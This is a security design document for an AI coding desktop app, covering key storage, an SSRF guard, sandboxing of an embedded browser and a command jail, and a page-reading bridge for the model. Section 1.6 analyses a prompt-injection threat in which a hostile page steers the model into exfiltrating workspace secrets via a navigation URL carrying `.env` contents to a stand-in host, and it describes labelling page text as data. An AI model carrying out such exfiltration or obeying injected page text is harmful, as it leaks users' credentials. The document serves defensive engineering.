# Codify — Security, Persistence & Roadmap (v2)

## 1. Security additions for the multi-agent/multi-provider system

### 1.1 API key storage

- Raw keys are NEVER persisted by the Engine in plaintext and NEVER echoed back in any API response — only `api_key_ref` (a keychain handle) is returned.
- Engine: Python `keyring` over the Linux Secret Service (libsecret: GNOME Keyring, KWallet) under `codify/agents/{role}` and `providers/{slug}`. Codify is Linux-only; no other platform's keychain is a supported target.
- Where no usable keyring exists (headless Linux, no Secret Service, `keyring` not installed), keys go to `~/.codify/secrets.json` at mode `0600` instead — still never SQLite, still never returned by the API. `GET /settings/keys` reports `storage` so the UI states which store is in use rather than promising a keychain it does not have. See `04` §7.
- Desktop: key typed into `ApiKeyField`, held in component state, sent once over the loopback HTTP call, dropped immediately after. NEVER written into `localStorage`, Tauri's store plugin, or logs.

### 1.2 Local-provider SSRF guard

`AgentConfig.base_url` (used only when `provider == "local"`) MUST be validated against an allowlist before every request:

```python
def validate_local_base_url(url: str) -> None:
    parsed = urlparse(url)
    if parsed.hostname not in ("127.0.0.1", "localhost"):
        raise ValueError("Local provider base_url must point at localhost")
    if parsed.scheme != "http":
        raise ValueError("Local provider must use http (loopback only)")
```

Without this, a malicious or careless `base_url` could turn Coder/Tester/etc. into an SSRF vector against internal network services.

**The other direction: a stored key follows the URL.** That guard covers the `ollama` protocol only, so
for a long time `PUT /settings/agents/scribe {"provider": "openai", "base_url": "http://10.0.0.5:8080"}`
was accepted and a listener there received `Authorization: Bearer <the stored key>` on `/models` and on
every completion (audit of 2026-09-29, M5). The rule is now about the key, not the protocol
(`providers.key_destination_problem`): **a stored API key is sent to an `https` endpoint or to a
loopback one, and nowhere else.** A keyless plain-http server on the LAN is unaffected — there is
nothing to protect — so refusing is conditional on a key existing. It is enforced at every place a key
can leave: the save that would point a keyed provider (primary or fallback) at such a URL is refused
`400 invalid_base_url` *before* the key is stored, the provider constructors refuse to hold a key for
one (so `ProviderFactory.build` holds it for a row that got into the database some other way), and
model discovery reports the refusal instead of requesting. The message names the host, never the URL,
because a base URL can carry userinfo.

*What this does not do.* An `https` endpoint is trusted as much as its owner: pointing a keyed
provider at `https://attacker.example` is still accepted, because a corporate gateway or OpenRouter
looks exactly the same. Doing that needs the boot token, and a boot-token holder can already run the
project's tests as the user and read `secrets.json`, so a re-entry-of-the-key prompt would add a step
without adding a boundary. This closes the cleartext leak; it does not claim more.

### 1.3 Engine–Desktop auth token

On boot, the Engine generates a random token, writes it to stdout, and requires `Authorization: Bearer <token>` on every request. Desktop reads it from the child process stdout when it spawns the Engine and attaches it to every engine call the UI makes (`ui/src/api.ts`) — including `/settings/agents/*`, the most sensitive routes (attacker-controlled local `base_url`, key-reference overwrite).

The token is created once per state directory and persisted at `<state dir>/boot_token` (`0600`), not rotated per spawn: a client holding it then survives an engine restart, which per-spawn rotation broke for every client that could not re-read the handshake itself. `CODIFY_BOOT_TOKEN` overrides the value for a caller that wants a per-process token. Lifetime, and what a longer-lived credential costs, are in `04` §6.

The UI holds the token **in memory** when it runs under the desktop shell: it asks the shell for the engine's port and token on every health probe (`codify_get_engine_info`), so nothing needs it at rest, and a copy in the webview's `localStorage` would be a second, less protected home for a credential whose file is `0600`. An older build's stored copy is deleted on load. Only the standalone browser preview, which has no shell to ask, still keeps a pasted token in `localStorage` (`ui/src/api.ts`, `StaleAuthBanner`).

### 1.4 Retained from v1

- Command allowlist in `SandboxService` — additionally scoped by who asks and when: the verifier's proposed commands and the conductor's `run_command` / `verify` moves reach it in `test` mode, never the fixer's, planner's or critic's raw output, and the conductor's only once the goal is approved (see the accepted risk below). The librarian's requests reach it in `read_only` mode.
- **What the allowlist does not stop (accepted risk).** `validate_argv` decides *which program* runs and with which flags; it cannot decide what the program does. `pytest`, `python <script>.py`, `npm run <script>`, `cargo test` and `go test` all execute code that lives in the workspace, and the fixer is the role that writes into the workspace. So an approved goal can write a file and a verification step can then run it, as the user, with the user's permissions, in a process group that is killed on timeout. That is inherent to running a project's tests, not a hole in the allowlist, and it is why the `write` move refuses while the goal is unapproved (docs/00 §6.9) and why the environment handed to these processes is filtered (`guarded_env`). Treat approving a goal in an untrusted repository as approving that repository's test suite. The conductor's `run_command` honours that sentence rather than only quoting it: a *turn* has no approval step, so before the goal is `RUNNING` (and never on a plan-only goal) it runs in `read_only` mode, and asking "what does this project do?" of a hostile clone cannot start its code (`tests/test_conductor.py`, `test_project_code_runs_only_once_the_plan_is_approved`).
- **Linters and type-checkers are on the same side of that line as the test suite, not the read-only side.**
  `ruff check`, `mypy`, `tsc --noEmit`, `cargo check|clippy`, `go vet` and `make lint|typecheck` are `test`-mode
  commands (`04` §5), refused in `read_only` and so refused to the librarian and to a turn before approval.
  Per binary, what they run: `ruff` and `tsc` read the repository's config and source and run no repository code
  (ruff with `--no-cache`, tsc with `--noEmit`); `mypy` imports the plugins a `mypy.ini` / `pyproject.toml` names,
  `cargo check|clippy` runs a `build.rs` and proc-macros, `go vet` can start the C compiler for cgo, and `make`
  runs whatever the target says. Those four are covered by the sentence above (approving a goal in an untrusted
  repository is approving that repository's tooling); the first two do not widen it. The model never supplies
  the flags that matter: the engine appends them after validation (`hardened_args`) and the validator refuses
  every flag it does not list, so `--fix`, `--install-types`, `-vettool`, `make -f` and the like cannot be asked for.
- Per-command argument policies (not `cmd[0]` only): e.g. `python` only with `-m pytest` / script-path-inside-workspace.
- `FileSystemService` path containment (`root_path` boundary check).
- **Protected workspace roots** (`fs.protected_root_reason`). A workspace root is refused — `400
  invalid_root` when it is created, and a `ProtectedRootError` (a `PathEscapeError`, so it fails the step
  the way an escape does) when anything tries to write into one that predates the rule — if it is `$HOME`
  or contains it (that is `/` and `/home` too), one of the system directories themselves (`/etc`, `/usr`,
  `/var`, `/tmp`, and `/bin`/`/lib*` however they resolve), inside `~/.ssh`, `~/.gnupg`, `~/.aws` or
  `~/.kube`, or Codify's own state directory. The reason is that an approved goal writes through the same
  `apply` as any source file, so a `$HOME` workspace could rewrite `~/.bashrc` or
  `~/.ssh/authorized_keys` (audit of 2026-09-29, L3). It is about the root, not about file names: a
  dotfiles repository *below* `$HOME` owns a `.ssh/config` and a `.bashrc` that are only files in a repo,
  so those stay writable. There is no override; a subfolder is the answer, and reading is unaffected.
- Engine binds to `127.0.0.1` only.

### 1.5 Embedded browser: deny-by-default webviews

The workspace shell's browser (`src-tauri/src/browser/`) is the first surface in Codify that renders untrusted content. Its isolation has four layers, and the first three are asserted by Rust tests in that module rather than assumed:

- **Empty capability set.** `src-tauri/capabilities/browser.json` covers the `browser-*` webview labels with an empty `permissions` list. `browser::tests::the_browser_capability_set_is_empty` parses the committed capability files and fails if any permission reaches a browser label — through `browser.json` itself, a widened `*` pattern in any other capability, or an inline capability added to `tauri.conf.json` (`tauri_conf_inlines_nothing_for_browser_webviews`). The file must also exist and must match a label built by `webview_label`, so the declaration can neither be silently absent nor silently out of sync with the labels in use.
- **Loopback URL guard, on every navigation.** Only `http`/`https`, and never a loopback/unspecified host: `localhost`, `*.localhost` (which covers Windows' `http://tauri.localhost`), all of 127/8, `::1`, `0.0.0.0`, `::`, IPv4-mapped IPv6 spellings, and the integer/hex/octal forms the WHATWG parser canonicalises (`http://2130706433/` is 127.0.0.1). Checked in `open`/`navigate` before anything exists, and again by `WebviewBuilder::on_navigation` for every navigation the page attempts, redirects included. This is §1.2's rule inverted: a local provider *must* point at loopback, a browser page *must not* be able to reach it.
- **An app ACL manifest, so the first layer has something to deny with.** Tauri enforces capabilities against application commands (`codify_*`) — not just plugin and core commands — only when the app defines an ACL manifest. With none defined it lets a **local**-origin invoke of any `codify_*` command through unchecked, where local means relative to the `devUrl` or the app's own assets (`tauri://localhost`, `http://tauri.localhost`). That pass is what `src-tauri/permissions/shell.json` closes: one `allow-` permission per `codify_*` command, collected into a `shell` set referenced by `capabilities/default.json` and by nothing else — and that file's `windows` is `["main"]`. Every app invoke is now resolved against the calling label whatever its origin, so a `browser-*` label resolves to nothing. Asserted by `the_app_acl_manifest_closes_the_local_origin_bypass` (the flag Tauri reads, through Tauri's own resolver), `the_grant_reaches_main_and_no_browser_label` and `the_app_manifest_is_referenced_by_exactly_one_capability`.
- **The origin guard, now defence in depth.** Remote-origin invokes were always rejected unless an explicit `remote` capability resolved them, and this app configures none. With layer 4 in place the loopback refusal is no longer the only thing between a page and `codify_get_engine_info`: navigating onto `http://localhost:5173` or `tauri://localhost` gains a page nothing (§1.3, `00` §6.3), but still seats untrusted content where the app's own scripts run, and the two checks fail independently. Keeping the guard costs nothing and keeps that independence.

Two things about that container are worth stating here, because both were
mistaken for a rendering bug and neither is a security matter. Tauri builds
**every** webview into the window's default `gtk::Box`, and wry's box branch
packs a child expand-and-fill without reading the bounds it was handed — so a
page took a *share of the window* (half of Codify, then all of it) rather than
the pane's rectangle, while the UI reported the right one. And the commands
that seat a page are `async`, so they run on a tokio worker, which is not the
thread GTK will take a widget call on. `browser/page_layer.rs` now
owns both: a `gtk::Overlay` + `gtk::Fixed` of its own that a page can sit
*inside*, and one door (`on_main`) that asks the toolkit's own question before
every widget call. `09` §7.3 has the mechanism and the measurement; the point
for this section is that neither fact touches a capability, a guard or a
token — a page is still a page with an empty capability set, whatever rectangle
it is painted in.

The UI half is `docs/09` §7.3, and the page *is* embedded now — which is exactly why the grant is no longer keyed on `windows: ["main"]`. A child webview reports its parent's window label, so a window-matched grant would be inherited by every page seated in the window; `capabilities/default.json` matches on `webviews: ["main"]` and `capabilities/browser.json` on `webviews: ["browser-*"]`, and `browser::tests::no_capability_grants_through_a_window_pattern` fails the build if any capability that grants anything ever matches through a `windows` pattern again. Tauri resolves a capability with an *or* across `windows` and `webviews` patterns, so matching on `webviews` alone is what keeps the child outside the grant.

Honest limits: this is a navigation policy, not a network filter — subresource requests to loopback are not intercepted (they cannot reach an engine route without the bearer token, which a `browser-*` label cannot invoke for), and a DNS name that *resolves* to loopback (`127.0.0.1.nip.io`) passes a lexical guard by construction. The capability set is the boundary that does not care what the host resolves to, and the app ACL manifest is what makes that set mean anything. The manifest gates Tauri's `invoke` surface only; the engine subprocess, the PTYs and the webviews are all created from Rust, where no capability reaches them. The browser pane's one remaining escape is granted to the app's webview alone and does not widen the page: DevTools is a shell-side inspector over the webview, and a page cannot even open its own. **There is no open-external control any more**: handing the page's URL to the OS opener is the one escape that leaves the app entirely, so it was removed rather than guarded, and the browser module's `the_only_escape_is_the_inspector_and_the_module_spawns_nothing` fails the build if `open_external`, `open::that_detached` or a `codify_browser_open_external` command comes back. The crate that served it is gone too — `the_open_crate_is_not_a_dependency_and_nothing_reaches_for_it` reads `Cargo.toml` *and* every file under `src/`, because a command can be removed from every source file while the dependency that fed it keeps pulling `windows-sys` and `is-wsl` into the build graph, and no leg of the gate calls an unused dependency an error. See `09` §7.2 for the built surface.

The page also declares who it is, and that was a lie until recently. wry's WebKitGTK default announced `Version/60.5 Safari/605.1.15` — Safari 15.4, released in 2022, with Apple's build number for it — on a WebKitGTK 2.52 engine. `browser::page_user_agent` now sends `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/605.1.15 (KHTML, like Gecko) Codify/<version>`, keeping the `AppleWebKit` token because the engine really is WebKit and it is the one token every parser already looks for. The point of saying so is that a site can now tell it is talking to something that is not pretending, and the measured claim is narrow: across four sites, two runs each and three strings — the honest one, wry's Safari default, and Chrome — **no site behaved differently** (`09` §7.4). The string was a true statement and a red herring. `CODIFY_PAGE_USER_AGENT` replaces it wholesale for every page, which is what makes that comparison possible at all, and it is an env var rather than a setting because it cannot be persisted by accident and is visible in the process listing; empty falls back to the honest default. `an_override_replaces_the_whole_string_and_nothing_else` pins that a comparison cannot quietly send a string no page ever saw.

### 1.6 The AI reads the page, and can move the tab — and the page still has nothing

The bridge in `engine/webview_bridge.py` and `src-tauri/src/webview_bridge.rs` lets the model read the tab the user is looking at, and follow a link off it. It is the first thing in this codebase that deliberately hands untrusted web content *to* a model, so it is worth being exact about what crosses and what does not.

A page can reach exactly one channel: `codify-bridge://reply/<id>/<seq>/<last>/<chunk>`, served by `webview_bridge::scheme_handler`. It needs no capability, which is the point — a custom scheme is not the network and not a Tauri command, so it is the one reply path a page with an empty capability set can reach at all. What travels on it is **text, and nothing else**: no boot token, no command name, no path, no argv. `webview_bridge::this_module_does_not_grant_a_browser_page_anything` scans the module for the three things it must never name.

Four properties hold it together, and each is asserted rather than intended:

- **A page can only answer a question this process asked.** `deliver` accepts a chunk only for an id in the pending set, only at the sequence number it expects next, and only once. A page can fetch the reply URL as often as it likes; a wrong id, a resend or an out-of-order chunk is dropped. Engine-side, `WebviewBridge.answer` refuses any id it did not issue.
- **The channel works, which is a measured fact rather than an intended one.** It did not, for as long as the bridge existed: `open_tabs` reached pages through `app.get_webview_window("main")`, which returns `None` from the moment the first page is seated (tauri defines a webview window as one with *no* child webviews), and every script then threw `ReferenceError` on its first line because the request id and the scheme were interpolated as bare words rather than literals. The shell reported "there are no browser tabs open" about an app with one open, and the only evidence anything was wrong was the page's own console. Both lookups now go through the manager, both values are JSON-escaped, and `every_value_the_template_interpolates_is_a_literal_and_not_a_bare_word` checks all six interpolations in all three scripts — a shape check is not enough, because `smoke0001` was always a well-formed id and only its JavaScript *literal* was wrong. `make smoke-embed` now exercises the round trip for real: `example.org` and `youtube.com` answer over the scheme, and a site whose CSP forbids all three channels (`reddit.com`) fails the run rather than passing it.
- **What comes back is typed down before the model sees it.** `_clean_result` keeps six named fields and drops everything else, so a page cannot introduce a key the formatter treats as something other than text, and the text is capped on both sides of the process boundary.
- **It is labelled as a website's words.** `format_page` tells the model, in the same breath as the text, that it is data about a site and not instructions — the one place a reader might otherwise mistake a page for a command.
- **Navigation goes round the guard, never through it.** `navigate_page` lets the model move a tab, and it does so through `browser::navigate` — *the same function* `codify_browser_navigate` calls for a user's click. The model proposes an address; `parse_navigation` decides, in Rust, on the address that arrives in the shell, and the page's redirects are guarded again by `on_navigation` afterwards. This module contains no host check of its own, and `webview_bridge::a_model_proposed_url_goes_through_the_guard_and_not_a_copy_of_it` fails the build if one appears — a second copy of the loopback rule is a second rule to get wrong. The engine's side is a *pre-filter*, not a guard: it refuses a URL that is not http(s) or is absurdly long, because that is a round trip not worth making, and `navigate` says so in its own docstring.
- **Navigation cannot escalate the model's authority, and it is not an egress guard.** A destination is another page in the same embedded webview: no capability, no engine access, no boot token. That is the *whole* of the claim. This bullet used to continue "so the worst a hostile page can talk the model into is showing the user a different page — which it could already do by navigating itself", and that was false in the one way that matters here: **a page cannot read the workspace, and the model can.** `navigate_page` takes the address from the model, `parse_navigation` admits any public http(s) URL, and nothing in between can tell a destination from a destination used as a payload — so `navigate_page("https://elsewhere.example/?d=<contents of .env>")` is a one-call way out of the machine for anything the turn has read, needing no approval, with nothing in the transcript but the address. The guard decides *where* a navigation may go; it cannot decide whether the address is carrying data out, because the address **is** the payload. The same holds for `type_page` into a field a page watches, and for `click_page` on a submit control after it. The surface to reason about is the model's *read* capability crossed with these three tools, not the page's attention — and every navigation is still announced in the turn's transcript (`conductor moved <tab> to <url>`) before it happens, because it is the one bridge tool whose effect is visible.
- **New tabs are not on offer.** `browser::open` needs the content rectangle the UI measures and owns, so a tab the bridge invented would have no geometry. `resolve_tab` refuses with the list of open tabs instead.
- **Acting on a page is the page's own event, and the report is the page's own claim.** `click_page` and `type_page` eval a script in the page and wait for it to answer over the same one-directional scheme; there is no second channel and no capability, so a page gains nothing by refusing. What comes back is deliberately narrow: `click_script` refuses a disabled control rather than reporting a click that would have done nothing, and `type_script` refuses a `<div>`, a checkbox or a radio rather than pretending a field was filled. Neither claims an outcome — a click is "this element was clicked", not "the page went there" — and `_clean_action` keeps only the fields `format_action` already prints, falling back to the selector the engine asked for so a bare `{"ok": true}` is still tied to an action. The one verb that writes is the one whose wording is most careful: a typed result says *which button it pressed* (none) and refuses to promise the text stayed put — "a page may send what it is given as you type" — because the failure mode is a model telling a user it signed in, and "nothing was submitted" was a claim the engine was not in a position to make.
- **The model cannot name its own operation.** `op` is a fixed string chosen in `engine/webview_bridge.py` and matched in `webview_bridge::serve`; an op the shell does not know is refused with a sentence naming it, so a version mismatch is diagnosable rather than silent. `webview_bridge::serve_routes_the_four_verbs_and_nothing_else` pins that the three page verbs share one route, because a `click` that reached no match arm would be refused as an unknown operation.

Honest limits: a page whose Content-Security-Policy forbids `connect-src`, `img-src` and `sendBeacon` can reach no channel at all, and the read then reports that as the reason rather than as a blank page (the script tries all three for exactly this reason). A page *can* lie about what it contains — which is what a page is — and that is why the model is told the text is untrusted. A page can also name a link, and the model can follow it; links are filtered to http(s) at the page and again in the engine, but a link to a hostile site is a link to a hostile site, and that is now a thing a turn can do to a user. And the bridge widens nothing about who can reach the engine: the engine's routes require the bearer token, which a `browser-*` label has no way to invoke for.

**The empty capability set is load-bearing in a place that is easy to get wrong: a page cannot tell the app anything.** This is not a policy line, it is a measurement — the embedded first-paint smoke (`09` §7.4) originally had the page announce a paint by calling `__TAURI_INTERNALS__.invoke("plugin:event|emit_to", …)`, and the invoke was refused, because `emit_to` is an ACL-governed command and a `browser-*` label resolves to no permissions. The smoke then reported a 20s first-paint timeout on a machine where the page had painted in 0.9s and all four environment diagnostics read healthy — an instrumentation bug that reads exactly like a rendering bug. The page now marks the paint in its own document title, which needs no permission, and the shell's existing `on_document_title_changed` hook turns that into an event. The rule generalises: **anything a page is expected to do must be reachable with no capability at all**, and the browser module's `the_paint_script_announces_the_event_the_lib_listens_for` fails the build if the smoke script grows an `invoke` back. The deeper point for a reviewer is that a *denied* invoke is silent from the app's side, so an empty capability set shows up as a feature that mysteriously does nothing rather than as an error — which is why the browser's own test surface is a real run and not more capability assertions.

### 1.7 Commit scope

A step commits only the paths it wrote: `git commit -m <msg> -- <paths>`, staged with the same pathspec.
The engine never runs a bare `git add -A`, so a working tree with the user's own staged or half-finished
work is not swept into a commit named after the step, and their index is left as they left it. A step whose
proposal matched the file already commits nothing and says so (`04` §3.0).

### 1.8 Recall: the engine's own history, allow-listed (`built`)

`recall` is the conductor tool that answers *has this happened here before, and did we get past it?* It is
the first path by which **stored** content reaches a model's context — everything before it was read live
off disk or received over the bridge — so its containment is an allow-list, not a filter.

- **What may be recalled is enumerated, not described.** `RECALLABLE` in `engine/recall.py` names the event
  types recall reads and, per type, the named payload fields. Everything absent is unreachable no matter
  what is in the table — the query itself filters by the allow-list's keys, so a type left out is never
  even fetched. Two types are excluded deliberately: `diff` is file content and `library_evidence` is text
  a librarian read off a cloned repository. A tool that returns those would be the *easiest* way to put
  third-party text in front of a model, and it would arrive labelled "my own past history" — more
  persuasive than the same string arriving labelled "a file you just read". Recall grants nothing
  `read_file` does not already grant; what it manages is *salience*, not access.
- **Inside a recallable type, only the named fields are read.** A payload key the allow-list does not name
  for that type is never searched and never returned, so an `error` row carrying a `trace` field cannot
  smuggle it past the projection.
- **Log rows are gated by level.** `log` recalls only `warn`/`error` — the chattiest prose in the store is
  not what the tool is for, and a refusal usually lands in a log line with its reason attached.
- **The workspace scope is in the join.** `GoalService.recall_events` scopes with `WHERE g.workspace_id = ?`
  over a `JOIN` on goals. Filtering in Python would have *read* another workspace's rows to decide to
  discard them; the join never reads them at all.
- **The answer is bounded and labelled.** The scan is capped (`MAX_SCAN_EVENTS`), matches are capped and
  newest-first (`MAX_MATCHES`), every field is clipped (`MAX_FIELD_CHARS`), and a query shorter than
  `MIN_QUERY_CHARS` matches nothing. `format_recall` tells the model what it is holding — *recorded
  outcomes, not evidence about the current code* — and an empty result says it is an absence, not a proof
  it never happened (the scan covers the most recent 2 000 events, not all of history).
- **Recovery is inherited, not re-decided.** Which failures a retry later got past is answered by
  `engine.metrics.recovered_steps` — the same definition the statistics screen shows. A second
  implementation in `recall` would be a second answer to one question, and they would eventually disagree.
  It is computed over every scanned row, not just the matches, because the `fix_retry` that proves
  recovery is evidence and not itself a match.
- **The thread grain (`recall_threads`) reads a coarser unit on purpose.** It returns thread names,
  the workspace's recent asks (goal descriptions, clipped in the query), and run-outcome counts —
  never transcript bodies, never `turn_history`'s replies, never another workspace's threads (the
  scope is the same `WHERE c.workspace_id = ?`, and archived threads are excluded the way the tab
  list excludes them). What is exposed is what a new conversation needs — that the question was
  asked before, by whom, and how the runs ended — and nothing more granular than that.
- **Labels are asserted in tests.** `tests/test_recall.py` pins the exclusions by name, the log-level gate,
  the workspace join, the bounds, and the wording of the honesty labels.

### 1.9 The microphone (`built`)

Dictation (`04` §3.0.2) opens a microphone, which is the most personal thing this app touches, so the rules
are written down:

- **Only on a person's action, only through the engine.** A recording starts from the mic button through
  `POST /audio/dictation/start`, behind the boot token like every route (invariant 3). The webview is never
  granted the microphone: WebKitGTK's permission requests keep their default *no*, so neither the app's page
  nor anything in the embedded browser (§1.5) can open it.
- **Nothing is opened for nothing.** Start is refused before anything is spawned when dictation has no
  provider to send to.
- **Bounded.** One recording at a time, ended by stop, cancel, the engine's shutdown, or the 120 s cap,
  whichever comes first. `pw-record` runs under the spawn guard, so an engine that dies takes it down.
- **Not kept.** The recording lives in a `0700` directory under the state directory, is read once, sent once,
  and deleted on every road out (stop, cancel, cap-then-stop, failure, shutdown). A synthesized answer is
  streamed back and never written.
- **Sent only where the user chose.** Audio goes to the dictation provider named in Settings → Audio, which may
  be a local server; a stored key follows the same destination rule as every other (§1.2): https or loopback,
  never plain http to another host. The engine keeps no list of "speech providers": a provider is refused if
  it does not speak the OpenAI audio API, and says so. A typed server address applies to a custom provider
  only. A built-in provider keeps the catalogue's address, so an address saved beside `openai` cannot
  redirect the OpenAI key.

### 1.10 The clipboard history (`built`)

The clipboard history (`09` §11) keeps what was copied, cut or pasted in the window, which can include things
the person did not mean to keep, so its limits are written down:

- **Only what passes through this window.** It listens to the document's own `copy`, `cut` and `paste` events
  and to its own Copy buttons. It does not read the system clipboard, run a watcher, ask the webview for a
  permission (WebKitGTK's permission requests keep their default *no*, as for the microphone, §1.9) or start a
  process, so there is no new spawn site (`07`). A copy in another application, or inside a browser tab (§1.5,
  a separate webview), is not seen.
- **Never kept: a password field, anything marked `data-clipboard="off"`, and anything that looks like a
  credential.** The shapes mirror `redact_secrets` (invariant 4 is about what the engine returns, and this is not
  the engine, but the same care applies to what a window stores) and add the common provider prefixes. This is a
  **heuristic**: a credential in a shape it does not know is kept, and the drawer says what it refuses and offers
  Delete and Clear unpinned. The stored list is re-checked on every read, so a key put there by hand, or by an
  older build, is dropped when the window starts.
- **Kept here and nowhere else.** The window's `localStorage`, under `CODIFY_CLIPBOARD`: never sent to the engine,
  never in `~/.codify/codify.db` (invariant 7), never sent to a provider. Bounded to 50 unpinned clips, 20 pinned,
  and 10,000 characters a clip.
- **Pasting into a terminal cannot run what nobody read.** A clip with a newline in it is refused unless the
  shell has asked for bracketed paste, because otherwise each line runs as Enter. The history holds text from
  anywhere, which is why the rule is there. It uses xterm's own `paste`, the path a person's Ctrl+Shift+V takes,
  and gives the engine nothing: the terminal belongs to the shell layer (`09` §7).

### 1.11 The machine: an assistant that may type, inside a jail (`built`)

The machine tab (`09` §14) is the one place an assistant's keystrokes run commands **without** `validate_argv` (`00` §6.6), so everything that makes that acceptable is a claim about the
jail, and each one is written here with how it is held:

- **The person's files are never written.** The project is the *lower* layer of an overlay and is bound read-only; what the machine changes under `/work` goes to a size-capped, memory-backed layer in the machine's own mount namespace and is discarded with it (`09` §14.1a). The one read-write bind in the argv is that layer's merged directory, at `/work` and nowhere else, and the tests do not read that off the flags: a real jail is made to edit, delete and replace under `/work`, and the host's directory is then compared name for name and byte for byte. Where a host cannot make the layer the project is bound read-only, as it was before it existed, and the machine says so. Nothing else is writable except the scratch mounts, which are memory-backed and sized.
- **No credentials.** The environment is built (`--clearenv` and a short list), not inherited, so no boot token, provider key or `CODIFY_*` is in it; the person's `$HOME`, `~/.ssh`, `~/.codify`, the keyring socket, the display and D-Bus are not bound.
  A workspace that is `/`, `$HOME` or an ancestor of it, or a credential directory, is refused (§1.4's list).
- **No capabilities, and not root.** `--cap-drop ALL`; the jail's user is uid 1000 whoever started it. The launcher's own step runs as the person in a user namespace of its own, which gives it the right to mount and nothing else, and ends with `exec` into the jail: it is not in the jail and the jail does not inherit it.
- **Resources are bounded, with the mechanisms an unprivileged program has** (`09` §14.1b): per-process CPU and file-size `ulimit`s, a process cap, sized mounts, and a guard that ends the machine, saying why, when its processes add up to more than its share of the computer's memory. It is a poll, and it is stated as one.
- **No network unless the person opened it with one**, chosen once. **With the network on the jail shares the host's network namespace**, so it can reach `127.0.0.1` and the LAN. The engine's boot token (§1.3) is what protects the engine there; other local services have nothing. This is measured and stated on the tab, not hidden.
- **No fallback.** If `bwrap` is missing or user namespaces are refused, nothing starts and the person is told which. There is no code path that starts the shell without the jail.
- **A person alone opens one.** There is no operation, in the engine's table or the window's, that opens, closes or reconfigures a machine for the assistant, and what the model reads of one is framed as program output and not instruction.
- **Nothing leaves.** The jail has no write path to the workspace and there is no copy-out door; a person can select and copy text on the screen by hand (§1.10 keeps what passes through the window). Invariant 9 is unchanged.

**What this does not claim.** It is a jail on the **host's kernel**, not a virtual machine: there is **no seccomp filter**, so the host kernel's whole syscall surface is reachable from inside it, and a kernel vulnerability that can be reached from an unprivileged
user namespace is not contained by anything here, and **no limit set here is a defence against a kernel fault**: the jail has no kernel of its own to fail. There is no cgroup memory limit (the guard polls, and a program can allocate faster than it looks); a delegated cgroup would be stronger where one exists and is not built because it cannot be tested without systemd. Some distributions switch unprivileged user namespaces off, and then a machine cannot be opened at all (`make doctor` says so). A seccomp filter is the next hardening step and a VM backend the stronger one (`09` §14.9).

## 2. Persistence layer

Single file. **No `agents.db`.**

```
~/.codify/            # owner-only (0700)
~/.codify/codify.db   # workspaces, goals, plan_steps, events, agent_configs — owner-only (0600), with its -wal and -shm
~/.codify/boot_token  # loopback bearer token, owner-only (0600), created once per state dir
~/.codify/secrets.json  # only when no OS keyring is usable (0600)
```

The database holds every prompt, every diff the fixer proposed and every recalled event, so it is
protected as the token is: the state directory is created `0700` and the database file `0600` (created
with that mode, not chmod-ed afterwards, so there is no moment it is readable by anyone else; SQLite
gives its `-wal`/`-shm` files the same mode), whatever the process umask. An install an older build
made — directory `0755`, database `0644` — is tightened on the next start, only when this user owns
it and only by removing the group/other bits. A database placed elsewhere with `CODIFY_DB` gets the
same for the *file*; the directory it sits in is the user's and is never chmod-ed. (Audit of
2026-09-29, M11: this was `0755`/`0644`, hidden on Ubuntu by its `0750` home directories.)

`CODIFY_HOME` (or `CODIFY_DB` / `CODIFY_SECRETS`) redirects these, and a redirected run also stops using
the OS keychain so it cannot reach the real store — `04` §2.0, `04` §7. The test suite holds itself to
the same rule (`tests/hermetic.py`), and `make run-engine-scratch` does it for a manual smoke test.

- SQLModel maps Pydantic models in `04` §1.
- `update_goal` is check-and-increment; `409` `version_conflict` on miss.
- `agent_configs` seeded with `DEFAULT_AGENTS`; never deleted at runtime.

## 3. Updated phased roadmap

### Phase 0 — Skeleton (persisted from day one)

- `WorkspaceService` and `GoalService` (which also owns each goal's event sequence) backed by SQLite (not in-memory).
- Basic FastAPI endpoints + Engine boot token auth.
- `ExecutorService` with hard-coded steps, no agents yet.
- Desktop: workspace selection, goal creation, log streaming.

### Phase 1 — Sub-agent system (core of this revision)

- `AgentConfig` model + SQLite table + 5 seeded defaults.
- `BaseProvider` + Anthropic/OpenAI adapters (Google/local can follow).
- `AgentRegistryService`, `ProviderFactory`, `AgentOrchestrator`.
- `/settings/agents` API (list, get, update, test-connection).
- Desktop: Settings → Agents (only editor); `agent_assigned` → read-only badges elsewhere.
- The planner and `ExecutorService` refactored to `orchestrator.run_agent(role, ...)` instead of a single `LLMService` (the planner is a role now, not a service of its own).

### Phase 2 — Git, diffs, Reviewer Agent

- Full `GitService`.
- Reviewer Agent phase between "apply changes" and "finalize step" — MAY send a step back to `FAILED`/`IN_PROGRESS` with change requests. MUST NOT auto-rerun Coder; Desktop click restarts the step.
- Diff view + "Approve changes" / "Commit" flow in Desktop.

### Phase 3 — Local provider + polish

- `LocalProvider` (Ollama) with the SSRF allowlist from §1.2.
- Google provider adapter.
- Per-agent cost/latency stats on Agents settings cards (last response time, last error).
- Filterable logs, per-step detail, dry-run indicator throughout.

### Phase 4 — Engineering debt (scheduled, not started; measured 2026-09-29)

Three items, in this order, because each makes the next one safe. Every number below was measured on this tree, not estimated.

**4.1 Tests that run the app instead of reading it — done as far as it can be.** A source-text test proves the words are there, not that pressing the control does anything; four of the bugs found in the 2026-09-29 audit had a green one throughout. `ui/tests/appHarness.ts` mounts the whole App against a recording fake engine and shell, and `ui/tests/dom.ts` mounts a single component; between them the wiring tests now click and read what the app asked for. Converted in the latest round, each mutation-checked (break the component, watch the test fail): `ollamaRoleFields` (the role card is mounted, the fields are gated on the protocol, an emptied field is sent as `null`), `engineRuntime` (the card is mounted with the engine's answer supplied, and Settings' Agent Roles tab is opened to prove it is reachable), `traceArming` (a seeded thread is opened and the recording control is pressed against a fake engine that arms only while a goal is PLANNING and answers `trace_locked` otherwise), `motionPreference`'s App half (the shell's event, the banner, *Animate anyway*, a stale verdict at boot) and the two render loops (`atmosphereMotion` now mounts both), and `scheme`'s import wiring, which `appearanceInteraction` already held by clicking. What the conversions turned up in the app itself: the Ollama fields' labels were not tied to their inputs (so no accessible name), and the card's *Saved* timer outlived the card. `sourceTextTestBudget.test.ts` is no longer a count, because a count said how many and never which, and it had drifted (it read 27 for a tree that held 23). It is an allow-list: a test file that reads source as text is a failure until it is named with its reason, and a file that stops is a failure until its line is deleted. Of the 17 that remain, all 17 are `text` by nature (a palette with no hard-coded hex, the bytes of a GIF, an `index.css` token, a Rust constant that must equal a TypeScript one, an argument name the Rust command must match, lint-style rules over the painters' files), and none is `unconverted`. The last four were converted afterwards, by mounting the real things: `backdropShell.test.ts` 